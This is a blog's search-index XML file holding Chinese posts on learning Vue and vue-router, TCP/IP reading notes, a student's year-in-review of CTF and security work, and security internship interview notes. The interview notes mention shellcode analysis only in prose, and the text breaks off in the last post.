<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vue学习笔记（二）</title>
      <link href="/2020/01/14/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/01/14/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="vue学习笔记（一）"><a href="#vue学习笔记（一）" class="headerlink" title="vue学习笔记（一）"></a>vue学习笔记（一）</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><blockquote><p>简单研究了一天VUE框架，然后单手撸了一个前端模板，算是半成品吧，其中了解了前端路由，以及组件式的开发模式，简要记录一下吧。</p></blockquote><h2 id="vue-router"><a href="#vue-router" class="headerlink" title="vue-router"></a>vue-router</h2><h3 id="SPA简介："><a href="#SPA简介：" class="headerlink" title="SPA简介："></a>SPA简介：</h3><blockquote><p>SPA(single page application):单一页面应用程序，只有一个完整的页面；它在加载页面时，不会加载整个页面，而是只更新某个指定的容器中内容。单页面应用(SPA)的核心之一是:更新视图而不重新请求页面;vue-router在实现单页面前端路由时，提供了两种方式：Hash模式和History模式。</p></blockquote><blockquote><p>Hash模式我没怎么用，多是使用History模式，这两种的模式具体可参考<a href="https://www.jianshu.com/p/ccb67b20049f" target="_blank" rel="noopener">SPA(single page application)[单页面应用]</a></p></blockquote><h3 id="vue-router具体使用"><a href="#vue-router具体使用" class="headerlink" title="vue-router具体使用"></a>vue-router具体使用</h3><h4 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h4><p><img src="./img/vue-router-%E9%85%8D%E7%BD%AE.png" alt="vue-router-配置"></p><blockquote><p>其实很简单，我们安装好vue-router后，在router文件夹里面的index.js就可以配置路由视图，推荐使用vue-ui来安装，会自动生成该文件同时附带示例。</p></blockquote><blockquote><p>具体解释看下方代码注释</p></blockquote><pre><code class="js">import Vue from &#39;vue&#39;import VueRouter from &#39;vue-router&#39;// // Vue.use(VueRouter)// import Layout from &#39;@/layout/index&#39; // 这里使用正常的加载组件的模式// const routes = [  {    path: &#39;/&#39;, //路由路径 相当于https://localhost:8080/#/    name: &#39;layout&#39;, // 路由名字，在其他组件里面，可以使用 this.$route.name 来获取当前路由的名字    component: Layout, //该路由加载的组件    redirect: &#39;/index&#39;, // 这里我使用重定向功能 来跳转至 ~/#/index    children: [ //配置子路由        {            path: &#39;index&#39;, // 子路由路径 相当于/#/index 注意前面的&#39;/&#39;会自动加上,所以我们配置该字段时不用加            name:    &#39;Index&#39;, // 路由名字            component: () =&gt; import(&#39;@/views/index/index&#39;), //这里使用懒加载的模式，就是访问到该路由时，才加载组件            meta: { title: &#39;index&#39; } // 可以理解为该路由携带的信息        }    ]  }]</code></pre><h4 id="使用路由视图"><a href="#使用路由视图" class="headerlink" title="使用路由视图"></a>使用路由视图</h4><blockquote><p>其中可以发现我路由配置出了Layout组件在layout文件夹下，其余全在views文件下，这个就是利用路由来布局页面，之前刚学习的时候不是态度，学习了许多别人项目结构布局才突然领悟到这点, 这里给出我的项目结构：</p></blockquote><pre><code class="shell">|---src   #源代码文件夹----|---assets  #静态资源文件夹，比如图片子类的----|---components  #全局组件文件夹----|---layout  #布局文件夹--------|---components   #存放布局相关的组件--------|---index.vue   #布局组件----|---plugins   #插件目录 这里主要方便统一维护插件--------|---axios.js  #使用网络发包的插件--------|---element.js  #使用element.js的组件----|---router  #路由文件夹--------|---index.js  #路由配置文件----|---store----|---styles   #全局样式文件夹----|---views  #视图文件夹----|---App.vue  #组件入口----|---main.js  #全局入口----|---settings.js #全局设置</code></pre><blockquote><p>基本大题框架如此，不得不说，框架模式下的开发，相对效率会快很多，而且多人协作模式下，更能统一接入口，极大提高开发效率</p></blockquote><blockquote><p>配置好路由后，我们在Layout文件夹下使用路由来作布局</p></blockquote><pre><code class="html">&lt;!-- @/layout/index.vue --&gt;&lt;template&gt;    &lt;div class=&quot;layout&quot;&gt;        &lt;el-container&gt;            &lt;el-header class=&quot;global-layout&quot;&gt;                &lt;lay-navbar&gt;&lt;/lay-navbar&gt;            &lt;/el-header&gt;            &lt;el-main class=&quot;global-layout main-container&quot;&gt;                &lt;app-main&gt;&lt;/app-main&gt;            &lt;/el-main&gt;        &lt;/el-container&gt;        &lt;div class=&quot;footer footer-line&quot;&gt;            &lt;lay-footer&gt;&lt;/lay-footer&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/template&gt;</code></pre><blockquote><p>其中app-main组件就是我们页面中部的呈现位置，代码如下</p></blockquote><pre><code class="html">&lt;!-- @/layout/components/AppMain.vue --&gt;&lt;template&gt;    &lt;div id=&quot;app-main&quot;&gt;        &lt;transition name=&quot;el-fade-in-linear&quot;&gt;            &lt;keep-alive&gt;                &lt;router-view :key=&quot;key&quot; /&gt;            &lt;/keep-alive&gt;        &lt;/transition&gt;    &lt;/div&gt;&lt;/template&gt;&lt;!--  --&gt;&lt;script&gt;    export default {        name: &#39;AppMain&#39;,        computed: {            key() {                return this.$route.path            }        },        methods:{            Click: function(){                console.log(this.$route);            }        }    }&lt;/script&gt;</code></pre><blockquote><p>这里我们就使用<code>&lt;router-view :key=&quot;key&quot; /&gt;</code>，以及通过computed里面来通过<code>this.$route.path</code>的改变来改变key值使得组件得以动态加载，配合动画效果就能做到页面的无缝切换。</p></blockquote><blockquote><p>撸了两天的效果图：<br><img src="./img/E-CTF.gif" alt="E-CTF"></p></blockquote><h3 id="关于路由的安全性问题"><a href="#关于路由的安全性问题" class="headerlink" title="关于路由的安全性问题"></a>关于路由的安全性问题</h3><blockquote><p>待更新…</p></blockquote><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><blockquote><p>哈，我本身以后的方向不打算做前端开发，所以也并没有太过深入的去了解vue框架的使用，仅仅只是需要撸一套简单CTF靶场出来给社团用，所以顺手学习一下vue，以及基于其的开发模式，实际上动态加载组件这一块，个人感觉有点类似ajax动态加载html页面，不过其使用的前端路由，不用发起网络请求，优点就是极大的提升了用户体验，不过不利于seo优化，因为编译出来的东西就一个html,其余全靠js，不过用来做app模式，小程序模式的开发，倒是效果与效率都不错</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> vue-router </tag>
            
            <tag> 前端路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue学习笔记（一）</title>
      <link href="/2020/01/12/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/01/12/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="vue学习笔记（一）"><a href="#vue学习笔记（一）" class="headerlink" title="vue学习笔记（一）"></a>vue学习笔记（一）</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><blockquote><p>VUE火了一两年了，整好假期需要开发点东西，想画个好看的UI，顺手就把VUE学一下…</p></blockquote><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><blockquote><p>这一步比较简单，我没遇见啥问题，顺手记录一下吧。</p></blockquote><pre><code class="shell">npm install vue vue-cli -gvue ui</code></pre><blockquote><p>成功安装后，并打开vue ui管理界面如下：<br><img src="./img/vue-ui.png" alt="vue-ui"></p></blockquote><blockquote><p>成功创建项目后，会进入项目仪表盘，如图：<br><img src="./img/vue-ui-%E4%BB%AA%E8%A1%A8%E7%9B%98.png" alt="vue-ui-仪表盘"></p></blockquote><blockquote><p>之后我们可以安装一下HbuilderX编辑器，此编辑器对vue支持更好，写起来比vscode手感更加流畅。<br><img src="./img/vue-%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84.png" alt="vue-项目结构"></p></blockquote><blockquote><p>src里面的main.js就是入口文件，不过vue的开发模式使得我们很少回去修改mian.js,App.vue就相当于index.html,不过由于vue中使用router更方便和灵活，也使得App.vue会很少被编辑和修改，例如element-admin源代码项目结构:<br><img src="./img/vue--element-admin%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84.png" alt="vue--element-admin项目结构"></p></blockquote><blockquote><p>我们基本完成安装，可以开始进一步学习。这里推荐一个bilibili上快速入门学习视频地址: <a href="https://www.bilibili.com/video/av76249419?p=1" target="_blank" rel="noopener">4个小时带你快速入门vue</a></p></blockquote><blockquote><p>视频上讲过的我就不在列举了，记录一些没有提到的，以及一些细节导致的问题，该系列后面的章节会写一些进阶的东西。</p></blockquote><h2 id="vue-动画操作"><a href="#vue-动画操作" class="headerlink" title="vue 动画操作"></a>vue 动画操作</h2><blockquote><p>先看一个简单的效果<br><img src="./img/vue-%E5%8A%A8%E7%94%BB.gif" alt="vue-动画"></p></blockquote><pre><code class="html">&lt;!-- App.vue --&gt;&lt;template&gt;  &lt;div id=&quot;app&quot;&gt;        &lt;!-- el-button 是我引入了element-ui组件库 --&gt;        &lt;!-- @click 相当于v-on:click v-on是vue指令后面跟事件就行赋予一个函数名 --&gt;        &lt;el-button @click=&quot;toggle&quot;&gt;toggle&lt;/el-button&gt;        &lt;!-- vue 官方的给出的组件 用于控制标签类的子标签过渡状态--&gt;        &lt;transition&gt;         &lt;!-- 通过v-show指令绑定一个flag变量 --&gt;            &lt;div class=&quot;chunk&quot; v-show=&quot;flag&quot;&gt;&lt;/div&gt;        &lt;/transition&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default {    name: &#39;app&#39;,    // 由于使用的是vue-cli搭建出来的脚手架，App.vue也相当于一个组件，所以data得是一个函数    data:()=&gt;{        return {            // 这里我们返回一个object类型直接写就行，变量定义在这里            flag: true        };    },    methods:{        // 组件内部函数定义在这里，        // toggle 就是上面click触发后调用的函数        toggle: function(){            this.$data.flag = !this.$data.flag;        }    }}&lt;/script&gt;&lt;style&gt;/* 这四个就是我们可以修改的样式类，来呈现出动画*/    .v-enter,    .v-leave-to{        opacity: 0;        transform: translateX(150px);    }    .v-enter-active,    .v-leave-active{        transition: all 0.8s ease;    }    /*  */    .chunk{        margin-top: 10px;        width: 50px;        height: 50px;        background-color: #34c2ff;    }&lt;/style&gt;</code></pre><blockquote><p>一些细节我在代码注释里面写得有，上面是一个手写动画演示的例子，比较简单，但真实开发环境，特别是自己接外包时，不太可能自己手写很多动画，多是使用第三方动画库，下面给出一个例子</p></blockquote><p><img src="./img/vue-element-%E5%8A%A8%E7%94%BB.gif" alt="vue-element-动画"></p><pre><code class="html">&lt;template&gt;    &lt;div id=&quot;app&quot;&gt;        &lt;el-button @click=&quot;flag = !flag&quot;&gt;Click Me&lt;/el-button&gt;        &lt;div style=&quot;display: flex; margin-top: 20px; height: 100px;&quot;&gt;            &lt;transition name=&quot;el-zoom-in-center&quot;&gt;                &lt;div v-show=&quot;flag&quot; class=&quot;transition-box&quot;&gt;.el-zoom-in-center&lt;/div&gt;            &lt;/transition&gt;            &lt;transition name=&quot;el-zoom-in-top&quot;&gt;                &lt;div v-show=&quot;flag&quot; class=&quot;transition-box&quot;&gt;.el-zoom-in-top&lt;/div&gt;            &lt;/transition&gt;            &lt;transition name=&quot;el-zoom-in-bottom&quot;&gt;                &lt;div v-show=&quot;flag&quot; class=&quot;transition-box&quot;&gt;.el-zoom-in-bottom&lt;/div&gt;            &lt;/transition&gt;        &lt;/div&gt;        &lt;div style=&quot;margin-top: 10px; margin-bottom: 10px;&quot;&gt;&lt;/div&gt;        &lt;el-button @click=&quot;flag2 = !flag2&quot;&gt;Click Me&lt;/el-button&gt;        &lt;div style=&quot;margin-top: 20px; height: 200px;&quot;&gt;            &lt;el-collapse-transition&gt;                &lt;div v-show=&quot;flag2&quot;&gt;                    &lt;div class=&quot;transition-box&quot;&gt;el-collapse-transition&lt;/div&gt;                    &lt;div class=&quot;transition-box&quot;&gt;el-collapse-transition&lt;/div&gt;                &lt;/div&gt;            &lt;/el-collapse-transition&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default {        name: &#39;app&#39;,        data: () =&gt; {            return {                flag: true,                flag2: true            };        },        methods: {}    }&lt;/script&gt;&lt;style&gt;    .transition-box {        margin-bottom: 10px;        width: 200px;        height: 100px;        border-radius: 4px;        background-color: #409EFF;        text-align: center;        color: #fff;        padding: 40px 20px;        box-sizing: border-box;        margin-right: 20px;    }&lt;/style&gt;</code></pre><blockquote><p>然后我们会发现，真的就复制粘贴，而且效果还不错，仅仅做一些普通的项目，对我们来说完全够用，但vue核心的地方不仅仅让我们体验到前端开发的流畅性，还有前端路由布局，axios库的网络通信。</p></blockquote><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><blockquote><p>写到这里已经快凌晨1点半了，明后天继续写。(￣o￣) . z Z</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> element-ui </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《TCP/IP协议详解卷一》学习笔记(一)</title>
      <link href="/2020/01/04/%E3%80%8ATCP-IP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E5%8D%B7%E4%B8%80%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/"/>
      <url>/2020/01/04/%E3%80%8ATCP-IP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E5%8D%B7%E4%B8%80%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="《TCP-IP协议详解卷一》学习笔记-一"><a href="#《TCP-IP协议详解卷一》学习笔记-一" class="headerlink" title="《TCP/IP协议详解卷一》学习笔记(一)"></a>《TCP/IP协议详解卷一》学习笔记(一)</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><blockquote><p>导师布置下学习任务，正好自己重新回头系统的学习一遍TCP/IP协议族的相关知识。</p></blockquote><h2 id="内容简述："><a href="#内容简述：" class="headerlink" title="内容简述："></a>内容简述：</h2><p>TCP/IP协议详解卷一，第一章概述，第二章链路层，第三章部分</p><h3 id="第一章："><a href="#第一章：" class="headerlink" title="第一章："></a>第一章：</h3><p>TCP/IP协议起源于6 0年代末美国政府资助的一个分组交换网络研究项目。<br>TCP/IP协议是一个协议族，通常被认为是一个四层协议系统。具体如下：</p><pre><code class="c#">-------|应用层| ---&gt; HTTP, FTP 和e-mail等-------|运输层| ---&gt; TCP/UDP-------|网络层| ---&gt; IP，ICMP， 和IGMP-------|链路层| ---&gt; 设备驱动程序及接口卡，ARP-------</code></pre><p>每一层自己理解具体负责功能列举如下：</p><blockquote><ol><li><code>应用层</code>，这一层实际上是已经完成三次握手后，应用程序相互通信时，由开发者自己定义是数据包格式，属于更进一步的包装，用于在网络程序通信时的逻辑处理，这个在样本分析截获恶意样本通信数据时，会有更明显的感觉，我们平时使用的代理，其所使用最常见的socket5，这个具体分析有机会在补上，已经HTTP协议等。</li><li><code>运输层</code>，这一层主要就是在做数据传输的处理，应用层我们可以理解为更进一步的数据打包，这一层就是相当于选择发送包裹的方式了，中通，还是顺丰，其实就是TCP/UDP，TCP（ Transmission Control Protocol）就是传输控制协议，UDP(User Datagram Protocol)就是用户数据报协议，这两个协议在编程时，给我感觉就是TCP有着可控性，能在一定程度上保证数据传输的完整性，而UDP就是要求速度，但丢包后没有重发机制，数据完整性较差，这个协议在做网络视频流媒体，比如直播，视频网站等使用比较多，因为视频一秒有很多帧，一帧丢几个包，实际上不会有太大影响，但可以更快的加载视频。</li><li><code>网络层</code>，这一层我没有很实际的编程体验，看书上给我的感觉就是在做选择工作，来判定数据包需要发往哪个IP接口。</li><li><code>链路层</code>，实际上就是硬件层，个人感觉这一层主要就是将传输过来的数据，在物理层面转化为数字层面的一个工作。</li></ol></blockquote><p>路由器（Router），书上描述是对不同类型的物理网络提供连接：以太网、令牌环网、 点对点的链接和F D D I（光纤分布式数据接口）等等。但我自己感觉还是没有在实践方面没有更具体的描述，感觉比较抽象。</p><p>书中给出一个TCP/IP协议族在实际使用时的结构图：<br><img src="./img/%E4%BD%BF%E7%94%A8%E7%BB%93%E6%9E%84%E5%9B%BE.png" alt="使用结构图"></p><p>编程具体使用的API接口我之前只知道socket，书中还提了一个TLI,运输层的接口，回头具体看看，socket用的最多，也就是面向应用层的开发接口，感觉没有特别复杂的地方。</p><h2 id="第二章："><a href="#第二章：" class="headerlink" title="第二章："></a>第二章：</h2><p>首先是以太网和IEEE数据封装，书中的图比较老，我网上找到一张：<br><img src="./img/IEEE802%E8%A7%84%E5%88%99%E6%A0%87%E5%87%86.png" alt="IEEE802规则标准"></p><p>根据上图RFC结构规则，<br>在wireshark中我们可以通过过滤eth.type==0x806来查看arp报，如图：<br><img src="./img/ARP.png" alt="ARP"></p><p>也可以通过eth.type=0x800来查看IP报，如下：<br><img src="./img/IP.png" alt="IP"></p><p>链路层的部分细节，我主要了解的回环接口的部分细节：<br><img src="./img/%E5%9B%9E%E7%8E%AF%E6%8E%A5%E5%8F%A3.png" alt="回环接口"></p><p>书中给出的关键点：</p><blockquote><ol><li>传给环回地址（一般是1 2 7 . 0 . 0 . 1）的任何数据均作为I P输入。 </li><li>传给广播地址或多播地址的数据报复制一份传给环回接口，然后送到以太网上。这是 因为广播传送和多播传送的定义（第 1 2章）包含主机本身。 </li><li>任何传给该主机I P地址的数据均送到环回接口。 看上去用传输层和 I P层的方法来处理环回数据似乎效率不高，但它简化了设计，因为环 回接口可以被看作是网络层下面的另一个链路层。网络层把一份数据报传送给环回接口，就 像传给其他链路层一样，只不过环回接口把它返回到 I P的输入队列中。</li></ol></blockquote><p>实际上简化理解就是，发往自己本机IP的数据包传输路径被简化，而回环接口的存在就是方便这个简化工作。</p><h2 id="第三章前半部分："><a href="#第三章前半部分：" class="headerlink" title="第三章前半部分："></a>第三章前半部分：</h2><p>IPv4数据报头的格式图：<br><img src="./img/IPV4%E6%8A%A5%E5%A4%B4%E6%A0%BC%E5%BC%8F.png" alt="IPV4报头格式"></p><p>之后根据wireshark抓包我们来具体看IPv4协议报的具体内容:<br><img src="./img/IPV4-header1.png" alt="IPV4-header-解析一"></p><p><img src="./img/IPV4-header2.png" alt="IPV4-header-解析二"></p><p>以上两种图为抓取ICMP协议的数据报文，图中对IP协议部分，根据IP协议头数据格式做了批注。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>《TCP/IP协议详解卷一》比较理论化，书中部分知识点，自己看还是有些地方比较懵，链路层一块的理解还没有特别深刻，网络层协议初步了解了IP协议报头的数据格式，结合wireshark来看，比较直观，能加深理解。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP/IP协议族 </tag>
            
            <tag> wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人年度总结</title>
      <link href="/2020/01/04/%E4%B8%AA%E4%BA%BA%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>/2020/01/04/%E4%B8%AA%E4%BA%BA%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="个人年度总结"><a href="#个人年度总结" class="headerlink" title="个人年度总结"></a>个人年度总结</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><blockquote><p>难得有时间，正好整理整理和大家分享一下自己这一年都做了什么，学到什么。</p></blockquote><h2 id="起点："><a href="#起点：" class="headerlink" title="起点："></a>起点：</h2><p>大一的寒假开始，听团队的师兄们说没人做和二进制漏洞相关的题目，正好我想着我来试试，开始接触PWN这个东西，在学习这个玩意的时候确实还是遇见很多坑，包括现在，当然比当初好了很多，这里回顾了一篇自己之前写了一篇总结文章，<br><img src="./img/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93.png" alt="pwn栈溢出总结"></p><p>其中在自己搭环境的发现每次练习一个题，都得手动去部署题目部署很麻烦，引发了自己做一套平台的想法，又花了三个星期的时间，捣鼓出一套自动化部署pwn题的平台<br><img src="./img/%E5%B9%B3%E5%8F%B01.png" alt="平台1"></p><p><img src="./img/%E5%B9%B3%E5%8F%B02.png" alt="平台2"></p><p>可惜后来手误操作，源码仓库被我删掉了，不过在写平台三个星期里，我学习了flask框架的使用，同时结合自己之前学习django对web开发有了更深一步的了解</p><h2 id="大一下"><a href="#大一下" class="headerlink" title="大一下:"></a>大一下:</h2><p>开学的前一天，突然莫名接了一个微信小程序开发的外包项目，当时喝了点酒，开价开少了，为啥嘞，因为我写了两遍，第一遍和朋友一起搞，没协调清楚，后期维护出一堆bug，所以重构一遍，完全自己一个前后端，到部署，以及数据库加密的实现全是自己一个人干，其中又学到很多东西，包括数据模型的建立，同时一个mysql数库的操作，一个mongodb的操作，就是钱拿少了，不过后面和客户联系，他们是拿去参赛，最后获得国赛二等奖，我还是挺(C)高（N）兴(M)的，说好的烟钱都没给我。<br>4月中旬开始基本上都是在打比赛，搞开发，先是DDCTF，最后以排名169的成绩收尾，还是太菜了，毕竟刚刚开始比较正式打这个比赛，其中学会了反序列化漏洞，而且当时的代码我审计了一天一夜，所以感触特别深，然后这学期用它的原理出个题赚了1680，打完DD就是国赛，飞了重庆，没能飞成都有点可惜，这个比赛我当时觉得我真尽力了，解题分数不算高，线上web0解，线下两天只解了一道，第二道意识不够差一点，最后靠着我花一周的时间出的题拿的高分，弄了个国赛二等奖，幸亏寒假搞的开发，出题的这一周学会了docker的使用，以及自己编写docker-compose.yml文件来自动化部署，这个后面发给客户时也用上了，以及redis数据库的基本使用，和未授权访问的原理，以及了解了一个数据持久化，，同时对linux的操作更熟练了，特别是权限控制，回头发现就特别简单，但能完出花样的姿势还是有很多没看。</p><h2 id="暑期："><a href="#暑期：" class="headerlink" title="暑期："></a>暑期：</h2><p>眨眨眼就到7月了，考完试军训开始了，军训这段时间，真的感觉是我20年来过得最难受的7月，暂时没有之一，不是因为军训有多累，而是某些事情所导致，这里不多谈（喝酒，喝酒）。<br>8月真的和7月比起来天上地下之分，运气好去拿到名额去参加了CTP,认识一堆师傅，同时也对整个内网攻击，和漏洞利用，有了一个初步的了解，（端口是万恶之源）大师傅说的，默默记下来，这里比较好玩，作为导师代表的大师傅，说话语速和当时作为学生代表的我差不多，但他说我比他慢，我不服，第一次遇见有说话语速和我一样的，大师傅很厉害，新西兰一套海景带花园别墅，3个星期赚60万的大佬，膜拜膜拜。</p><h2 id="大二上："><a href="#大二上：" class="headerlink" title="大二上："></a>大二上：</h2><p>9月份，和朋友搞了个数学建模大赛，我们当时作为大一生报的名，后面还搞了个省级二等奖，感觉也不错了，当时我复制做数据处理，我也没学过这方面的东西，现学现用，处理一千多万的GPS数据，第一次几个小时没跑出来，第二次40分钟，第三次10分钟，我全是自己写脚本来跑，没用任何现成的工具。这个感觉还是可以吹一下，哈哈。<br>10月，请了一个周的假去了上海看GeekPWN，参观了东方明珠，又认识几个师傅，一起吃了顿饭，不得不说，上海物价确实高。<br>11月，打进360杯职业赛决赛，飞了西安，看了古城墙，确实历史文化氛围，在回民街被坑，就比较难受了，3C有点可惜，我做出了虚拟机逃逸，但没find flag 吃大亏了，还是意识不够，不然搞不好二等奖都有了 3000块奖金，最后只得500，可惜了。<br>12月，考四级，多不说，只有比上次好就行了，至少我比上次多付出了一点呀，然后就是i春秋圣诞挑战赛，tm就是昨天，原本稳了两天前十的我，最后一天大家都py,一个逆向，一秒5人解，神仙，不过还好见识到了去花指令的操作，说起这个，我记得11月似乎开始研究恶意代码分析，哦也是前天，过了微步的一面，计划考完试和hr联系时间去北京面试，听说公司包车费，不过其中问的一些问题我确实还不太清楚，这里之前写了一篇文章记录下来，回头把几个点给补上</p><p><img src="./img/%E9%9D%A2%E8%AF%95.png" alt="面试"></p><p>最后前两天做了关于响尾蛇APT的样本分析，与空白师傅一起弄完了关于该组织的样本分析年度总结报告。<br><img src="./img/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A1.png" alt="APT分析报告1"></p><p><img src="./img/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A2.png" alt="APT分析报告2"></p><p>该报告详见：<br><a href="https://mp.weixin.qq.com/s?__biz=MzUyNzk2NDcwMw==&mid=2247484380&idx=1&sn=ed7cb176fec030cb6205f5ff7a453c39&scene=21#wechat_redirect" target="_blank" rel="noopener">GCOW官方微信公众号</a><br><a href="https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=2357" target="_blank" rel="noopener">微步在线X情报社区</a><br><a href="https://mp.weixin.qq.com/s/1_jyp2e8i10xmxBd9Dyxqg" target="_blank" rel="noopener">腾讯御见威胁情报中心-威胁情报周报</a><br><a href="https://mp.weixin.qq.com/s/Myho3ZvxXcd0TWhv1XR-fw" target="_blank" rel="noopener">奇安信威胁情报中心-每周威胁情报解读</a></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>基本上，这一年我就是这样过来的，比较大的变化是，我越来越像是夜猫子了，工作时间，怎么都变成了晚上，调一道逆向，能调到凌晨，发现晚上工作才有灵感。哈哈。<br>其实回头过来一想，自己一年，也还是学到不少东西，但记录下来的太少，还是得养成最少三天一篇文章的习惯。<br>看上去感觉似乎自己过的还算充实，但不知为何总感觉很失落，感觉还是有些迷茫，似乎技术上学了些东西，但学校的课程几乎没怎么听，概率论估计出问题了，下周还得考大物，乘着今天又时间，更新补起。</p>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微步电面-收获总结</title>
      <link href="/2019/12/28/%E5%BE%AE%E6%AD%A5%E7%94%B5%E9%9D%A2-%E6%94%B6%E8%8E%B7%E6%80%BB%E7%BB%93/"/>
      <url>/2019/12/28/%E5%BE%AE%E6%AD%A5%E7%94%B5%E9%9D%A2-%E6%94%B6%E8%8E%B7%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="微步电面-收获总结"><a href="#微步电面-收获总结" class="headerlink" title="微步电面-收获总结"></a>微步电面-收获总结</h1><blockquote><p>前言：想着大二的寒假找机会实习，就投了微步的简历，第一次收到的电话面试，面试的李哥问到的一些问题，自己当时确实还不知道，同时总结一下面试中学到的 :)</p></blockquote><h2 id="面试流程篇"><a href="#面试流程篇" class="headerlink" title="面试流程篇"></a>面试流程篇</h2><h3 id="自我介绍："><a href="#自我介绍：" class="headerlink" title="自我介绍："></a>自我介绍：</h3><p>一篇准备好的自我介绍很重要，面试官之前肯定看过你的简历，但是开始面试时还是会让你简单做一下自我介绍，大家现在肯定比较好奇，实际上这个环节是比较重要的，此时的自我介绍不在仅仅只是简历上的内容，我面试的属于安全行业，所以可以大概简明扼要的说一下自己怎么解除这一行业的，大部分安全行业的从业者基本都有个共性，可能大家当初了解网络安全的时候，都会带着一丝武侠小说的情怀在里面，这个确实吸引了大部分安全从业者兴趣吧，就我自己了解来说13年左右感觉上安全爱好者数量的一个爆发期，这里不多谈。只是想告诉大家，在自己介绍的环节可以谈谈自己当初有过什么比较好玩，或者有趣的经历在接触或学习这一行的路程中  (￣▽￣)。</p><h3 id="技术面试："><a href="#技术面试：" class="headerlink" title="技术面试："></a>技术面试：</h3><p>这个就是很重要的环节了，不用我说大家也知道，特别是我们这一行很看技术能力，自己技术能力基本完全决定了面试能否通过，我下面列举一下当时李哥问的一些问题，我面的方向主要是做恶意代码分析，逆向工程相关的。</p><blockquote><ul><li>问：PE结构是否熟悉？<br><br>回答思路：由于我基本是从做CTF PWN题开始的，对可执行文件结构的了解，ELF结构相对偏多，但记得本质上是COFF结构，PE，和ELF都是其变种，所以我可以从共性上来回答，同时也想到之前看的滴水逆向课程中将任意文件解析执行为任意PE文件的操作，个人感觉的重点是PE头，节区表，数据段，以及入口地址，如果我们完全了解这几个点，基本上就能改造任意PE文件，但可能我当时回答的不是特别清楚，这一块回头必须得重新系统的学习一下</li></ul></blockquote><blockquote><ul><li>问：有没有调过那些有意思shellcode？<br><br>回答思路：这个真的幸亏电面前天做的一个响尾蛇的APT样本分析中遇见了，当时样本利用的cve-2017-11882，来执行shellcode，（关于这个样本的分析我回头补上，简单描述实际上比较简单，shellcode主要利用地址无关技术，这个具体的文章我后面考完试也补上。）这个样本shellcode比较有意思的地方就把密文解密后替换掉命令行字符，来加载执行，其中解密过程很简单，就算异或一个12具体可以参考下图：<br><img src="./img/shellcode_1.png" alt="shellcode_1"></li></ul></blockquote><p><img src="./img/shellcode_2.png" 